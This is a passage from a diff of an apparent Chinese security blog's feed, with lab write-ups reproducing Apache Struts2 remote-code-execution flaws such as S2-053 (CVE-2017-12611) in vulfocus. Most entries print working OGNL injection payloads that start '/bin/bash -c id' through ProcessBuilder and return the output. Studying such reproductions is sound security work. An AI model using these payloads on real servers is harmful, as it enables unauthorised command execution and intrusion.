java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081408.png" alt="image"></p><p>或直接使用工具<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081409.png" alt="image"></p>]]></content>
+    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.1-2.3.33<br>Struts 2.5-2.5.10</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081412.png" alt="image"></li><li>利用POC</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;%&#123;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#context.setMemberAccess(#dm)))).(#cmds&#x3D;(&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,&#39;id&#39;&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#process&#x3D;#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>burp抓包构造payload<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081413.png" alt="image"></li></ol>]]></content>
     
     
-    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限&lt;/p&gt;
-&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本&lt;/p&gt;</summary>
+    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。&lt;/p&gt;
+&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts 2.0.1-2.3.33&lt;br&gt;Struts 2.5-2.5.10&lt;/p&gt;</summary>
     
     
     
@@ -347,28 +369,6 @@
     
     <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;alwaysSelectFullNamespace为true。&lt;br&gt;action元素没有设置namespace属性，或者使用了通配符。&lt;br&gt;命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞&lt;/p&gt;
 &lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts 2.3–2.3.34&lt;br&gt;Struts2.5–2.5.16&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="vulfocus靶场练习" scheme="https://hzktester.top/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
-    
-    
-    <category term="Struts2" scheme="https://hzktester.top/tags/Struts2/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>S2-053 CVE-2017-12611复现过程</title>
-    <link href="https://hzktester.top/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://hzktester.top/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
-    <published>2020-08-14T07:31:00.000Z</published>
-    <updated>2020-09-21T12:03:39.062Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.1-2.3.33<br>Struts 2.5-2.5.10</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081412.png" alt="image"></li><li>利用POC</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;%&#123;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#context.setMemberAccess(#dm)))).(#cmds&#x3D;(&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,&#39;id&#39;&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#process&#x3D;#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>burp抓包构造payload<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081413.png" alt="image"></li></ol>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。&lt;/p&gt;
-&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts 2.0.1-2.3.33&lt;br&gt;Struts 2.5-2.5.10&lt;/p&gt;</summary>
     
     
     
